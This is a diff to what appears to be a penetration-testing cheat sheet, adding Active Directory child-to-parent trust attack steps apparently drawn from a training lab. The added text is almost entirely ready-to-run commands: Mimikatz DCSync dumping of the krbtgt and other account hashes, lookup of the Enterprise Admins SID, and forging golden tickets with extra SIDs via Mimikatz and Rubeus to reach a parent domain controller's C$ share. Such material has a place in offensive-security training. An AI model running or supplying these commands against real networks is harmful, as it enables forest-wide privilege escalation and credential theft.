@@ -1536,6 +1536,32 @@ C:\> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:<domain> 
 $ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain <domain> -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 <username>
 ```
 
+- Child -> Parent Trusts (Mimikatz)
+
+```
+mimikatz # lsadump::dcsync /user:<domain>\krbtgt
+PS C:\> Get-DomainSID
+PS C:\> Get-DomainGroup -Domain <domain> -Identity "Enterprise Admins" | select distinguishedname,objectsid
+OR
+PS C:\> Get-ADGroup -Identity "Enterprise Admins" -Server "<domain>"
+PS C:\> ls \\academy-ea-dc01.inlanefreight.local\c$
+mimikatz # kerberos::golden /user:hacker /domain:<Child Domain> /sid:<Child Domain SID> /krbtgt:<Child Domain KRBTGT Hash> /sids:<Enterprise Admins SID> /ptt
+PS C:\> klist
+PS C:\> ls \\academy-ea-dc01.inlanefreight.local\c$
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
+```
+
+- Child -> Parent Trusts (Rubeus)
+
+```
+PS C:\> ls \\academy-ea-dc01.inlanefreight.local\c$
+PS C:\> .\Rubeus.exe golden /rc4:<Child Domain KRBTGT Hash> /domain:<Child Domain> /sid:<Child Domain SID>  /sids:<Enterprise Admins SID> /user:hacker /ptt
+PS C:\> klist
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
+```
+
 #5. - Privilege Escalation
 -----------------------------------------
 
